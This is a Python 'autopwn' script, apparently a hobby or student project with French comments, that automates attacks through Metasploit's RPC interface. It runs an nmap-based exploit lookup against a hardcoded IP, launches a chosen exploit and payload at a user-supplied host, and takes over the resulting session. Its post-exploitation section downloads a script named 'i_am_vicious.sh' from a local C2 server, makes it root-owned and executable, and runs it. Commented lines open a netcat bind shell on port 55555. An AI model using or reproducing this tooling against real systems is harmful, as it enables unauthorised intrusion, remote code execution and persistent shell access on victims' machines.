#!/usr/bin/python3

import subprocess
import pprint
import json
from pymetasploit3.msfrpc import MsfRpcClient
import time
from logs import LOG
import post.postexploit as postexploit

PROMPT = "pwnguin@victim~ "

RED = "\033[1;31m"
YELLOW = "\033[33m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"

LOW = "Low"
MEDIUM = BLUE + "Medium" + RESET
HIGH = YELLOW + "High" + RESET
CRITICAL = RED + "Critical" + RESET

SEVERITY_TEXT = {"LOW": LOW, "MEDIUM": MEDIUM, "HIGH": HIGH, "CRITICAL": CRITICAL}


logfile = open("./logtest", "a+")

LOG("Launched autopwn.",logfile,"inf")

def show_pwnguin():
    """Displays pwngin ASCII art logo, nothing useful"""
    print(
        f"""
                                            (#(
                                        @@@/#&@&
                                  (&@@@,#&&@@&&&&&&&@@(
                             #@@@( %&&&&&&&@@@@@@@@@@
                         ,@@%/&&&&@@@@@@@@@@@@@@@@@@@@,
                       @@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@&
                    ,@@&&&&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
                   @@@&&@@&@#,,&@@@@@@@@@@@@@@@@%**%@@@@@@@@&
                 #@@@@@@%          %@@@@@@@@(          @@@@@@@,
                @@@@@@@   @@&        (@@@@,        @@&  /@@@@@@&
               @@@@@@@.    ,%@{RED}@@{RESET}&,     %     /@{RED}@@{RESET}@(,    #@@@@@@&
              @@@@@@@@    ..@@{RED}&..{RESET}@@@.    #@@{RED}@...@{RESET}@@,     @@@@@@@#
             &@@@@@@@@      {BLUE},@@@@@@{RESET}  .{YELLOW}%({RESET}  {BLUE}./@@@@@@,{RESET}      @@@@@@@@/
            /@@#&@@@@@            ,@{YELLOW}@&.  /@{RESET}@@            @@@@@&%@@
            @@/&&#@@@@@          @@{YELLOW}((/,*///%{RESET}@%          @@@@@%&&#@@
           .@&%@&@,@@@@@         .,/@{YELLOW}@/(((@{RESET}@,.          @@@@@.&&@#@@
           ,@(@@@&&,/@@@@.         ...{YELLOW}%@@/{RESET},.          ,@@@@,(&@@@&&@.
            """
    )


IP = "192.168.1.45"
CMD = "./explookup.sh " + IP + " >> /dev/null" # Sortie standard dans /dev/null pour la lisibilité, à changer
EXPLOIT_LIST = "./exploit_list"

show_pwnguin()
time.sleep(3)

scan = subprocess.run(CMD, shell=True)

if scan:
    msg = "Launching scan over @" + IP + " cmd :" + CMD
    print("[i] Launching scan over @" + IP + " cmd :" + CMD)
    LOG(msg,logfile,"log")
else:
    LOG("Error 1 : nmap failed.",logfile,"err")
    print("[X] Error 1 : nmap failed.")
    exit(-1)

with open(EXPLOIT_LIST, "r+") as f:
    result = json.loads(f.read())

# Create exploits from the list of research
exploits = []
for search in result:
    exploits += search["RESULTS_EXPLOIT"]

LOG("Imported exploit_list",logfile,"log")

if exploits:
    titles = []
    for k, pwn in enumerate(exploits):
        titles.append([k, pwn["Title"]])
else:
    LOG("Error 2 : Parsing error.",logfile,"err")
    print("[X] Error 2 : Parsing error.")
    exit(-2)
LOG("Parsed ./exploit_list",logfile,"log")

print("[~] Possible exploits :")
if titles:
    pprint.pprint(titles)
    print("\n")
else:
    LOG("Error 3 : No exploit found on Metasploit.",logfile,"err")
    print("[X] Error 3 : No exploit found on Metasploit.")
    exit(-3)
LOG("Displayed possible exploits to user",logfile,"log")

choice = input("[~] Please select an exploit: ")
attack = titles[int(choice)][1][:-12]

print("[V] Exploit selected ! :")
print(attack)
print("\n")
LOG("User selected " + attack,logfile,"log")

print("Starting msfrpcd...")
proc = subprocess.run("msfrpcd -P yourpassword", shell=True)
time.sleep(5)
LOG("Started process msfrpcd" + attack,logfile,"inf")

proc = subprocess.run("msfdb reinit", shell=True) # if db problem
LOG("Started process msfdb (arg reinit)" + attack,logfile,"inf")

client = MsfRpcClient("yourpassword", ssl=True)
print("\n")

modules = client.modules.search(attack)

modulus = []
for mod in modules:
    modulus.append([mod["type"], mod["fullname"]])

print("[~] Available modules :")
for k in range(len(modulus)):
    pprint.pprint(str(k) + " : " + modulus[k][0] + " : " + modulus[k][1])
LOG("Displayed modules",logfile,"log")


exploit = client.modules.use(modulus[0][0], modulus[0][1])
print("[V] Selected payloads: ", exploit.info)

print("Exploit options :")
print(exploit.options)
print("\n")

plds = exploit.targetpayloads()
print("[~] Available payloads :")
pprint.pprint(plds)

pay_idx = int(input("Which payload do you want to use ? : "))
payload = client.modules.use("payload", plds[pay_idx])
print("[V] Payload selected !")
LOG("User selected payload",logfile,"log")
print(payload.missing_required)
print("\n")


exploit["RHOSTS"] = input("Remote HOST : ")
payload["LHOST"] = "192.168.1.86"

print(exploit.execute(payload=payload))
time.sleep(15)

print(client.sessions.list)
print("\n")

shell = client.sessions.session("1")
LOG("Shell obtained",logfile,"log")

print("[~] Entering command and control section")
LOG("Entered in C&C section",logfile,"inf")
# Idée : définir des séquences de commandes pour encore + automatiser le pwn d'un point de vue user

#sequence = ["whoami",
#            "touch pwnguin",
#            "nc -l -p 55555 -e /bin/sh"]


print("[~] Opening local C2 server ...")

(proc,port) = postexploit.openCtrlSrv("192.168.1.86")
ipport = "http://192.168.1.86:"+str(port)

sequence = ['curl '+ipport+"/post/i_am_vicious.sh -o mignon.sh",
            'chown root:root mignon.sh',
            'chmod +x mignon.sh',
            './mignon.sh']

if shell:
    shell.write("pwd")
    time.sleep(3)
    print(shell.read())
    shell.write("whoami")
    time.sleep(3)
    print(shell.read())
    shell.write("ifconfig")
    time.sleep(6)
    test = shell.read()
    print(type(test))
    print(test)
    #print(shell.read())
    # time.sleep(6)
    # shell.write(sequence[1])
    # time.sleep(6)
    # shell.write(sequence[2])
    # time.sleep(6)
    # print(shell.read())
    # shell.write(sequence[3])
    # time.sleep(6)
    # print(shell.read())
    # print(PROMPT + "whoami")
    # shell.write("whoami")
    # print(PROMPT + shell.read())
    # print(PROMPT + "touch pwnguin")
    # shell.write("touch pwnguin")
    # print(shell.read())
    # print(PROMPT + "nc -l -p 55555 -e /bin/sh")
    # shell.write("nc -l -p 55555 -e /bin/sh")
    # print("\n")
else:
    LOG("Error 4 : Could not get a shell.",logfile,"err")
    print("[X] Error 4 : Could not get a shell.")
    exit(-4)

print("[V] Pwn complete !!! ")
print("[V] Listener available @ " + IP + ":55555 ")

LOG("nc listener opened on target on port 55555",logfile,"log")
LOG("END OF LOGS",logfile,"crit")
logfile.close()
exit(0)
